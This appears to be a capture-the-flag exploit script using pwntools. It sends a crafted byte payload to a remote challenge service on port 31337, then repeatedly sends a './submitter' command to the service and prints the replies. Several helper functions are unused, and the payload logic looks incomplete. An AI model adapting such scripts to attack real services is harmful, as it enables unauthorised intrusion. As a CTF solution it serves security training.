#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

# io = remote(HOST, int(PORT))
# io.interactive()

def init():
  cmd = b'1234\x0023412'
  return cmd, cmd[4], 0

def fuzz(n):
  return bytes.fromhex('04') + b'fUzZ' + bytes([n]) + b'tHiS'

def roof(n):
  return bytes.fromhex('80 01000000 ffffffff') + bytes([n])

def wiggle():
  return bytes.fromhex('10 5555555555555555 ff')

def math():
  return b'\x40\x0011113377'

def shift(b, n):
  return bytes([(bb+n) % 256 for bb in b])

# ===

#r = process('./challenge.py')
r = remote(HOST, int(PORT))

def payload_build():
  payload = [fuzz(0) for _ in range(100)]
  payload[0], mul, count = init()
  payload[1] = shift(fuzz(0), 1)
  for i in range(2, 100):
    payload[i] = shift(fuzz(0), i)
  payload[99] = shift(math(), 99)

#   mul, count, bounce
  return b''.join(payload)

r.sendline(payload_build())

import time
time.sleep(5)

r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
r.sendline('./submitter')
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
